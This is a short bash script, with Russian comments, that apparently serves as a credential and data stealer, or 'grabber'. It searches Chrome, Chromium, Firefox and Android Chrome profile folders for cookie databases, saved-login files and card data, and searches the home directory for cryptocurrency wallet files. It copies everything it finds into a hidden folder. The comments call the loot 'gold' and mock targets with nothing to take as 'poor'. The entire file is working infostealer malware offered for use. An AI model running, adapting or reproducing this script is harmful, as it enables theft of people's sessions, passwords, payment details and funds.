#!/bin/bash
# Только золото — cookies, пароли, карты
OUT="$HOME/.shadow_gold_$(date +%H%M)"
mkdir -p "$OUT"

echo "[GRABBER] Ищу золото..."

# 1. Cookies — самое ценное
echo "[GRABBER] Cookies..."
find /data/data/com.android.chrome ~/.config/google-chrome ~/.config/chromium ~/.mozilla 2>/dev/null -name "Cookies" -o -name "cookies.sqlite" | while read f; do
    [ -f "$f" ] && cp "$f" "$OUT/" 2>/dev/null && echo "  🍪 $f"
done

# 2. Пароли
echo "[GRABBER] Passwords..."
find /data/data/com.android.chrome ~/.config/google-chrome ~/.config/chromium ~/.mozilla 2>/dev/null \( -name "Login Data" -o -name "logins.json" \) | while read f; do
    [ -f "$f" ] && cp "$f" "$OUT/" 2>/dev/null && echo "  🔑 $f"
done

# 3. Карты
echo "[GRABBER] Cards..."
find /data/data/com.android.chrome ~/.config/google-chrome ~/.config/chromium 2>/dev/null -name "Web Data" | while read f; do
    [ -f "$f" ] && cp "$f" "$OUT/" 2>/dev/null && echo "  💳 $f"
done

# 4. Крипта (быстро)
echo "[GRABBER] Crypto..."
find ~/ -maxdepth 2 -name "wallet.dat" -o -name "*.wallet" 2>/dev/null | while read f; do
    [ -f "$f" ] && cp "$f" "$OUT/" 2>/dev/null && echo "  💰 $f"
done

# Сколько набрали
GOLD=$(ls "$OUT" 2>/dev/null | wc -l)
echo "[GRABBER] Золота: $GOLD слитков"
[ "$GOLD" -gt 0 ] && echo "[GRABBER] Тихо уходим" || echo "[GRABBER] Пусто — цель нищая"
